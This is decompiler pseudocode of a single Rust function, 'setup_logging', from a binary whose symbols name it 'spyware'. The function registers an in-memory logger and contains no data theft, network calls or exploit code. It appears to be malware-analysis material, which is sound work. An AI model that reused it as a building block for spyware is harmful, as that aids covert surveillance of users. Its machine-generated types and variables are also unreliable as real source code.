char spyware::logging::core::setup_logging(struct_0 *a0)
{
    unsigned long v0;  // [bp-0x128], Other Possible Types: unsigned long long
    int v1;  // [bp-0x128]
    int v2;  // [bp-0x118]
    int v3;  // [bp-0x108]
    int v4;  // [bp-0xf8]
    int v5;  // [bp-0xe8]
    unsigned long long v6;  // [bp-0xd8]
    int v7;  // [bp-0xc8]
    unsigned long v8;  // [bp-0xb8]
    void* v9;  // [bp-0xb0]
    char v10;  // [bp-0xa8]
    void* v11;  // [bp-0xa0]
    char v12;  // [bp-0x98]
    void* v13;  // [bp-0x90]
    unsigned long long v14;  // [bp-0x88]
    void* v15;  // [bp-0x80]
    unsigned long long v16;  // [bp-0x78]
    char v17;  // [bp-0x68]
    int v18;  // [bp-0x60], Other Possible Types: char
    int v19;  // [bp-0x50]
    int v20;  // [bp-0x40]
    int v21;  // [bp-0x30]
    int v22;  // [bp-0x20]
    char v23;  // [bp-0x10]
    unsigned long long v25;  // rax

    ::0x456790::core::sync::atomic::atomic_store(*((long long *)&a0->field_0));
    v9 = 0;
    v10 = 0;
    v11 = 0;
    v12 = 0;
    v13 = 0;
    v14 = 8;
    v15 = 0;
    v16 = *((long long *)&a0->padding_1[7]) >> 2;
    *((int128_t *)&v7) = *((int128_t *)&a0->field_0);
    v8 = a0->field_10;
    v17.try_insert(&_ZN7spyware7logging4core22MEMORY_LOGGER_INSTANCE17h716e29c46813bbfaE, &v7);
    if (*((int *)&v18) == 6)
    {
        v0 = 6;
    }
    else
    {
        v1 = v18;
        v6 = *((long long *)&v23);
        v5 = v22;
        v4 = v21;
        v3 = v20;
        v2 = v19;
        if (v0 != 6)
        {
            core::ptr::drop_in_place<core::result::Result<(),spyware::logging::core::MemoryLogger>>(&v1);
            return 2;
        }
    }
    v25 = spyware::logging::core::MemoryLogger::global();
    if (!v25)
        core::option::unwrap_failed(&g_4b9bb0); /* do not return */
    (unsigned int)log::set_logger(v25, &g_4b9bc8).unwrap();
    core::ptr::drop_in_place<core::result::Result<(),spyware::logging::core::MemoryLogger>>(&v1);
    return 3;
}
